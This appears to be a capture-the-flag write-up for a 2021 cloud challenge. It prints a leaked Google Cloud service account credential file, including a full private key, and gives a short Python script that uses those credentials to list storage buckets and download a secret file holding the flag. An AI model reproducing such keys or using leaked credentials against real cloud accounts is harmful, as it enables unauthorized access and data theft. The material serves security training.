# An unhappy employee

> Fred Chee Hong Kat, a developer for Bug Bug Dev Ptd. Ltd, is a disgruntled employee with poor security hygiene! He has been flagged multiple times for poor password practices! Now, it finally hits him! Our threat intelligence feed discovered a set of leaked credentials available on the Dark Web. Can you help us investigate the matter? We need to know if our company's secrets are compromised!

A JSON file with credentials to a **Google Cloud service account** is provided.

```json
{
  "type": "service_account",
  "project_id": "whitehacks-csg-2021",
  "private_key_id": "7bdfb6adba76a4dbcd9b5fee23bf24fb60512e30",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCqGwhc9YNpgTV6\nLNycfDn6yQ0JTErW/MrZEy13HrxKk70mpNWCos3sfj3gTmYpQuC3Fq4zCY29RYQF\nqWCMABr0+oNdt4qgfgvwlRMljM4LWbu2SDh2v+/r7Ho7/SoDT4V4iZHve+eJEdr+\nCuV6Oioi8ovrD2DNhS1vwXvqOMnSG3xGZpJlgdbgPdZy3vs090wsJOJzcBgHq1sw\nYL+SDYYrxsKmAfHsmRaLBOOLdNqtBCLXSs9MtR05vdJClWKAYBdPOO/c/WNJs0dL\nhEDQkjsIjDHMlnu6KSwsrGuITthSE8gAAfhEr/FvdRRIRLPPtQgDxnc+vGSLthWQ\n9R0erD4jAgMBAAECggEAAP98mpMELNvJtQhLWQ2vh2WjknDkpYNBK2nd4+uFvkhE\nnVPtPsF2xNLuyQCcv9Q5HknfRsRhFQGx5xiZzOh5QAOyPpwDj7J9nnE5dghv8wgZ\nPlYJIsU4gqFWDEENfIx8Y3snJIkNEDRPHRtyQjfSJHdY0824yyvjWtr/P54KrRVi\nv0uVKb3StrWmE22vJdfcE9S/2lLFOEK1UeZB7mv3Dz96qG/j0nddjFZRCWiyWdnt\ntnovdRrbIltg9M2b1D53MvGuB+IrUxo4m2XAuL9DAAq/tj+eAqy0GpyXeMisGHDI\nDHEnPB/N50UQkVH5EtTjByyVHCrz09Xvqjt9nmQWlQKBgQDaLfkLOMqn38o4L9vf\n3lJE2fwmDlLwuNQIDBMobd070FOcdPZ3U1k/XpsTqykan4Q+ld6FzMb0JANaD532\ntnPWMfmipkbLYAEPtLeMPFMd2f00z9yzBbfJz+CtLfFKCX2QTB6wJ5y7tSao4OvW\n3YL5Y+Nw2tkor/6tRd65WEQT7wKBgQDHl7V2UFhWQx+JkhG0HwudVPAFQGmxG59Y\nEEcLiXWLy/G2udW1nh41P8/DaKEh5LMdk7eQ4ULkCGdecddf5wWXunTqTOJlzAmh\nX0x1qTr0Xaod8i/KgghV1ddW52tI9xu3uGn9Br6iiWQqkJmEMSPV/bDmmRwpsJjH\nuSx11JV1DQKBgQCwrBuH38QS7l/k4bRNcszxngbVljHJZhGkNoro6RYF0mtyPTA7\nbg3OB8DRy37sZRGEUH2xoSHWHrdsHUtPtWzVnQBFmhmnpCUX38Hl2A+CE7w7ILrZ\naJ7r195aveIujsLTryAGiv0a7tTQWdn/0r21TxKkl0LT9Lfo/bQeKABwlwKBgFZP\nMFU9YTXMSPMAi09MrYUXmcNrm0jPHRTD1TUT+BS/2IKf0d57xaxZL8rcj/FMKHh9\nzD+GaZqaV7jrmasLB8wZAT3giXZjyTZTM4kd6TSK3GmetTPpDxmvIzOdVzNySDYm\nNQ8Jv54hs4MEjJ4xccGztq/BPgB5MVgMp0E88HRxAoGAJoaIv410ekQoaVX9L8Rl\no6ZjWD6GTMT6Uw2VSIdBg0pP23RIIheWj5M8g8YMPvelyAOZBS8L9Z2rZbgzZ9PJ\nHSMTVuGVmj/Ygz5axYTQUDUyqZavO6ILcdlfXhe1Ycf/nfCyFcM0yS1vkNvFvYbX\nqxBm8Zs13zFUFhF5+0jkhFE=\n-----END PRIVATE KEY-----\n",
  "client_email": "fredchkmsa@whitehacks-csg-2021.iam.gserviceaccount.com",
  "client_id": "106171336443241412522",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/fredchkmsa%40whitehacks-csg-2021.iam.gserviceaccount.com"
}
```

We can use the python library [`google-cloud-storage`](https://pypi.org/project/google-cloud-storage/) to check if there is anything on **Cloud Storage** accessible by the service account.

```python
from google.cloud import storage

storage_client = storage.Client.from_service_account_json("creds.json")

buckets = list(storage_client.list_buckets())
print(buckets)  # There's a bucket called "fred_chkn".

blobs = list(storage_client.list_blobs("fred_chkn"))
print(blobs)  # There's a blob called "secret.txt"

# Download the blob
storage_client.bucket("fred_chkn").blob("secret.txt").download_to_filename("flag.txt")
```

The flag can be found inside the downloaded blob.

`WH2021{ea$y_Cl0uD_Ch@ll3ng3}`
